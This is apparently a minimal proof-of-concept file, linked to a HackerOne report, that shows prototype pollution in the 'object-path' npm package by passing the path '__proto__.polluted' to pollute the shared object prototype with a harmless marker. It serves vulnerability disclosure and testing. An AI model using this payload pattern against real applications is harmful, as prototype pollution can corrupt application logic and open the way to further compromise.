//https://hackerone.com/reports/878332
 
  const setPath = require("object-path");

   
  setPath({}, "__proto__.polluted", "yes");
// End of file
